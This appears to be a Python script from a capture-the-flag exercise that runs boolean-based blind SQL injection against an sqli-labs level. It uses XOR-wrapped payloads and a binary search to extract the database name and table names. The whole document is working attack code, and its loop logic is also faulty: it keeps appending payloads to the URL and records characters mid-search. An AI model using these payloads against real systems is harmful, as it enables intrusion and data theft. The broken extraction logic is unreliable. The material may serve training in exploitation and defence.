import time

import requests

url = "http://a4209167-c9a4-4d45-87cb-192a11033459.node4.buuoj.cn/Less-8/?id="
playload1 = "1'^(ascii(mid(database(),{},1)) > {})^1 --+"
playload2 = "1'^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctftraining')),{},1))>{})^1 --+"
databasename = ""
table = ""
for x in range(1, 1000):
    low = 32
    high = 127
    mid = (low + high) // 2
    while low < high:
        playload = playload2.format(x, mid)
        url = url + playload
        r = requests.get(url)
        r.encoding = "utf-8"
        if r.text.find("You are in...........") != -1:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
        if mid == 32 or mid == 132:
            break
        table += chr(mid)
        print(table)
        time.sleep(1)
